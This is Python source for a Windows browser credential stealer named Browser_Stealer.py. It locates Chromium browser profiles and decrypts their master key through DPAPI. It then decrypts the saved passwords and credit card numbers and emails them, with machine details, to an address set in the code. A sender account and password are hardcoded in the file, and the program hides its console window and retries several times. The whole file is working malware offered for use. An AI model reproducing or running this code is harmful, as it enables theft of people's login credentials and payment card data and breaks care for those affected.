############################################################################
#
#   Browser_Stealer.py [ Main Program ]
#   © 2022 ABDULKADİR GÜNGÖR All Rights Reserved
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	04/2022
#	All Rights Reserved (Tüm Hakları Saklıdır)
#
############################################################################
import os, sqlite3, random, string, shutil, smtplib, ctypes, platform, time, sys
from Crypto.Cipher import AES
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
#
#
class Settings:
    SMTP_SERVER      = "smtp-mail.outlook.com"
    SMTP_PORT        = "587"
    SENDER_ADDRESS   = "ajehdfgruewsf@outlook.com"
    SENDER_PASS      = "uy8mNbvx4c9agehe5uwk6wxv"
    RECEIVER_ADDRESS = "python.test.email@outlook.com"

# DataBrowser
class DataBrowser:
    #
    login_data ="Login Data"
    web_data   ="Web Data"
    #
    def __init__(self):
        self.local_state_path = None
        self.check_files = [DataBrowser.login_data, DataBrowser.web_data]
        self.files = list()

# Data_login
class Data_login:
    def __init__(self, url, username, password_encrpyt):
        self.url = url
        self.username = username
        self.password_encrpyt = password_encrpyt
        self.password_decrpyt = None
    #
    def check(self):
        if self.password_decrpyt is not None:
            if self.password_decrpyt != b'' and self.password_decrpyt != b' ':
                return True
        return False

# Data_card
class Data_card:
    def __init__(self, username, expire_mon, expire_year, number_encrpyt):
        self.username = username
        self.expire_mon = expire_mon
        self.expire_year = expire_year
        self.number_encrpyt = number_encrpyt
        self.number_decrpyt = None
    #
    def check(self):
        if self.number_decrpyt is not None:
            if self.number_decrpyt != b'' and self.number_decrpyt != b' ':
                return True
        return False

# Create Random Directory
class RandomTmp:
    def __init__(self):
        rr = random.sample(string.digits + string.ascii_uppercase, k=36)
        drc0 = rr[0] + rr[1] + rr[2] + rr[3] + rr[4] + rr[5] + rr[6] + rr[7] + "-" + rr[8] + rr[9] + rr[10] + rr[
            11] + "-" + rr[12] + rr[13] + rr[14] + rr[15] + "-" + rr[16] + rr[17] + rr[18] + rr[19] + "-" + rr[20] + rr[
                   21] + rr[22] + rr[23] + rr[24] + rr[25] + rr[26] + rr[27] + rr[28] + rr[29] + rr[30] + rr[31]
        self.tmp_path = os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + drc0
        os.mkdir(self.tmp_path)
        self.old_dir = None
    #
    def __new_file_path(self):
        rr = random.sample(string.digits + string.ascii_lowercase, k=11)
        drc1 = rr[0] + rr[1] + rr[2] + rr[3] + rr[4] + rr[5] + rr[6] + rr[7] + "." + rr[8] + rr[9] + rr[10]
        rr = random.sample(string.digits + string.ascii_lowercase, k=36)
        file = rr[0] + rr[1] + rr[2] + rr[3] + rr[4] + rr[5] + rr[6] + rr[7] + "-" + rr[8] + rr[9] + rr[10] + rr[
            11] + "-" + rr[12] + rr[13] + rr[14] + rr[15] + "-" + rr[16] + rr[17] + rr[18] + rr[19] + "-" + rr[20] + rr[
                    21] + rr[22] + rr[23] + rr[24] + rr[25] + rr[26] + rr[27] + rr[28] + rr[29] + rr[30] + rr[
                    31] + ".tmp"
        #
        os.mkdir(self.tmp_path +"\\"+drc1)
        return self.tmp_path + "\\" + drc1 , self.tmp_path + "\\" + drc1 + "\\" + file
    #
    def copy_file(self, file):
        if self.old_dir is not None:
            shutil.rmtree(self.old_dir, ignore_errors=False, onerror=None)
        self.old_dir, tmp = self.__new_file_path()
        shutil.copy2(file,tmp)
        return tmp
    #
    def close(self):
        if self.old_dir is not None:
            shutil.rmtree(self.old_dir, ignore_errors=False, onerror=None)
        shutil.rmtree(self.tmp_path, ignore_errors=False, onerror=None)

# Result, directory, files = dir(path)
def dir(path):
    files = list()
    directory = list()
    try:
        for tmp in os.scandir(path):
            if tmp.is_file():
                files.append(tmp.name)
            elif tmp.is_dir():
                directory.append(tmp.name)
        return True ,directory, files
    except:
        return  False ,directory , files

# browser = browser_files_find(browser, search_path)
def browser_files_find(browser:DataBrowser,search_path):
    rr,dd,ff = dir(search_path)
    if rr:
        for fname in  ff:
            for check_f in  browser.check_files:
                if fname == check_f:
                    browser.files.append( search_path + "\\" + fname )
        #
        for dname in  dd:
            cdname = search_path + "\\" + dname
            browser = browser_files_find(browser, cdname)
    #
    return browser

# (list) [browser0, browser1, ... ] = browser_find(search_path)
def browser_find(search_path):
    res = list()
    #
    rr,dd,ff = dir(search_path)
    if rr:
        for fname in  ff:
            if fname == "Local State":
                browser = DataBrowser()
                browser.local_state_path = search_path+ "\\" + fname
                return [browser_files_find(browser, search_path)]
        for dname in dd:
            cdname = search_path + "\\" + dname
            tmp = browser_find(cdname)
            res += tmp
    #
    return res

# (dict) json_data = json_file(file)
def json_file(file):
    import json
    # ***
    try:
        with open(file, "r", encoding="UTF-8") as rfile:
            data = rfile.read()
            return json.loads(data)
    except:
        return None

# string or None = masterkey_encrypt(file)
def masterkey_encrypt(file):
    import base64
    # ***
    try:
        return base64.b64decode(json_file(file)["os_crypt"]["encrypted_key"])
    except:
        return None

# string or None = masterkey(file)
def masterkey(file):
    import win32crypt
    # ***
    try:
        return win32crypt.CryptUnprotectData(masterkey_encrypt(file)[5:])[1]
    except:
        return None

# bytes or None = decrypt(master_key, encrypt_password)
def decrypt(master_key, encrypt_password):
    try:
        # redundant_portion_0 = encrypt_password[0:3]
        nonce_portion = encrypt_password[3:15]
        ciphertext_portion = encrypt_password[15:]
        #
        aes = AES.new(master_key, AES.MODE_GCM, nonce_portion)
        passwd = aes.decrypt(ciphertext_portion)[:-16]
        # redundant_portion_1 = aes.decrypt(ciphertext_portion)[-16:]
        return None if passwd == b'' else passwd
    except:
        return None

# (list) [Data_login0, Data_login1, ... ]= get_logins_data(masterkey, file_path)
def get_logins_data(masterkey, file_path):
    list_logins = []
    #
    try:
        db = sqlite3.connect(file_path, uri=True)
        cursor = db.cursor()
        cursor.execute("Select origin_url, username_value, password_value from logins")
        res = cursor.fetchall()
        cursor.close()
        db.close()
        #
        for url, name, password in res:
            tmp = Data_login(url, name, password)
            decrypt_data = decrypt(masterkey, tmp.password_encrpyt)
            if decrypt_data is not None:
                tmp.password_decrpyt = decrypt_data
            list_logins.append(tmp)
    except:
        return  list_logins
    return list_logins

# (list) [Data_card0, Data_card1, ... ] = get_cards_data(masterkey, file_path)
def get_cards_data(masterkey, file_path):
    list_cards = []
    #
    try:
        db = sqlite3.connect(file_path, uri=True)
        cursor = db.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year,card_number_encrypted FROM credit_cards")
        res = cursor.fetchall()
        cursor.close()
        db.close()
        #
        for name, month, year, number in res:
            tmp = Data_card(name, month, year, number)
            decrypt_data = decrypt(masterkey, tmp.number_encrpyt)
            if decrypt is not None:
                tmp.number_decrpyt = decrypt_data
            list_cards.append(tmp)
    except:
        return list_cards
    return list_cards

# (list) [browser0, browser1, ... ] = get_browsers()
def get_browsers():
    appdata = os.environ['USERPROFILE'] + "\\AppData"
    return browser_find(appdata)

# (list) [path0, path1, ... ] = get_search_paths(browser:DataBrowser, file:str):
def get_search_paths(browser:DataBrowser, file:str):
    files = []
    for fname in browser.files:
        try:
            if fname[-(len(file)):] == file:
                files.append(fname)
        except:
            continue
    return files

# Bool = send_email (subject:str, mail_content:str)
def send_email (subject, mail_content):
    try:
        session = smtplib.SMTP( Settings.SMTP_SERVER, int( Settings.SMTP_PORT) )
        session.starttls()
        session.login(Settings.SENDER_ADDRESS, Settings.SENDER_PASS)
        message = MIMEMultipart()
        message['From'] =  Settings.SENDER_ADDRESS
        message['To']   =  Settings.RECEIVER_ADDRESS
        message['Subject'] = subject
        message.attach(MIMEText(mail_content, 'plain'))
        session.sendmail( Settings.SENDER_ADDRESS,  Settings.RECEIVER_ADDRESS, message.as_string())
        session.quit()
        return True
    except:
        return False


# All process
def all_process():
    try:
        logins_list = list()
        cards_list = list()
        randomtmp = RandomTmp()
        # generate browser
        browsers = get_browsers()
        for browser in  browsers:
            m_key = masterkey( randomtmp.copy_file(browser.local_state_path) )
            for login in get_search_paths(browser, DataBrowser.login_data):
                for tmp in  get_logins_data(m_key, randomtmp.copy_file(login)):
                    logins_list.append(tmp)
            for card in get_search_paths(browser, DataBrowser.web_data):
                for tmp in get_cards_data(m_key, randomtmp.copy_file(card)):
                    cards_list.append(tmp)
        randomtmp.close()
        # send e-mail
        userprofile = os.environ['USERPROFILE']
        systeminfo  = platform.uname()
        xx = random.sample(string.digits , k=4)
        zz = random.sample(string.digits + string.ascii_uppercase, k=8)
        unprecedentednumber = xx[0] + xx[1] + xx[2] + xx[3] +"-" + zz[0] + zz[1] + zz[2] + zz[3] + zz[4] + zz[5] + zz[6] + zz[7]
        #
        tmp_account =  "PROCESS ID     : " + unprecedentednumber + "\r\n\r\n"
        tmp_account += "SYSTEM         : " + systeminfo.system + "\r\n"
        tmp_account += "COMPUTER NAME  : " + systeminfo.node + "\r\n"
        tmp_account += "USER PATH      : " + userprofile + "\r\n"
        tmp_account += "RELEASE        : " + systeminfo.release + "\r\n"
        tmp_account += "VERSION        : " + systeminfo.version + "\r\n"
        tmp_account += "MACHINE        : " + systeminfo.machine + "\r\n"
        tmp_account += "PROCESSOR      : " + systeminfo.processor + "\r\n\r\n"
        #
        for account in logins_list:
            if account.check():
                tmp_account += "URL          : " + account.url + "\r\n"
                tmp_account += "USERNAME     : " + account.username +"\r\n"
                tmp_account += "PASSWORD     : " + account.password_decrpyt.decode('utf-8', errors="ignore") +"\r\n\r\n"
        #
        for card in cards_list:
            if card.check():
                tmp_account += "CARD USERNAME          : " + card.username + "\r\n"
                tmp_account += "CARD EXPIRE MONTH      : " + str(card.expire_mon) +"\r\n"
                tmp_account += "CARD EXPIRE YEAR       : " + str(card.expire_year) + "\r\n"
                tmp_account += "CARD NO                : " + str(card.number_decrpyt.decode('utf-8', errors="ignore")) +"\r\n\r\n"
        #
        return send_email("ACCOUNT(S) AND CARD(S) INFO(S)", tmp_account)
    except:
        return False

# arg
def arg():
    argv = sys.argv
    number = len(argv)
    #
    smail = Settings.SENDER_ADDRESS
    spass = Settings.SENDER_PASS
    rmail = Settings.RECEIVER_ADDRESS
    #
    try:
        for ii in range(number):
            if ii != 0:
                if len(argv[ii]) > 7 and argv[ii][0:7].lower() == "-smail:":
                    Settings.SENDER_ADDRESS = argv[ii][7:]
                elif len(argv[ii]) > 7 and argv[ii][0:7].lower() == "-spass:":
                    Settings.SENDER_PASS = argv[ii][7:]
                elif len(argv[ii]) > 7 and argv[ii][0:7].lower() == "-rmail:":
                    Settings.RECEIVER_ADDRESS = argv[ii][7:]
    except:
        Settings.SENDER_ADDRESS = smail
        Settings.SENDER_PASS = spass
        Settings.RECEIVER_ADDRESS = rmail

# main
if __name__ == '__main__':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    arg()
    res = all_process() #1st attempt
    if not res: #2nd attempt
        time.sleep(10)
        res = all_process()
    if not res: #3th attempt
        time.sleep(30)
        res = all_process()
    if not res:#4th attempt
        time.sleep(60)
        res = all_process()
    if not  res:#5th attempt
        time.sleep(120)
        res = all_process()
    if not  res:#6th attempt
        time.sleep(600)
        all_process()
